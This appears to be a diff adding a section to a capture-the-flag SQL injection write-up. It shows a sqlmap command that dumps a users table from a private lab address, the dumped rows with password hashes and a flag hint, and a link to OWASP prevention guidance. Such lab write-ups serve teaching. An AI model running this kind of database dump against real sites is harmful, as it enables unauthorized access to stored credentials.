@@ -96,6 +96,23 @@ The decrypted hash md5 give: *FortyTwo*
 
 If we encrypt `fortytwo` with SHA256 we have: `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`
 
+### Sqlmap tool
+`sqlmap -u "http://192.168.2.128/?page=member&id=1&Submit=Submit#" --dump -T users`
+
+```
+Database: Member_Sql_Injection
+Table: users
+[4 entries]
++-------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------+
+| user_id | town     | planet | country  | last_name | first_name | Commentaire                               | countersign                      |
++-------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------+
+| 1       | Paris    | EARTH  | France   | me        | one        | Je pense, donc je suis                               | 2b3366bcfd44f540e630d4dc2b9b06d9 |
+| 2       | Helsinki | Earth  | Finlande | me        | two        | Aamu on iltaa viisaampi.                               | 60e9032c586fb422e2c16dee6286cf10 |
+| 3       | Dublin   | Earth  | Irlande  | me        | three      | Dublin is a city of stories and ecrets.                                      | e083b24a01c483437bcf4a9eea7c1b4d |
+| 5       | 42       | 42     | 42       | GetThe    | Flag       | Decrypt this password -> then lower all the char. Sh256 on it and it's good ! | 5ff9d0165b4f92b14994e5c685cdce28 |
++-------------------------------------------------------------------------------------------------------------------------------------------+----------------------------------+
+```
+
 ## Prevention 
 -> [SQL Injection Prevention - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
 ### Client Side (JQUERY)
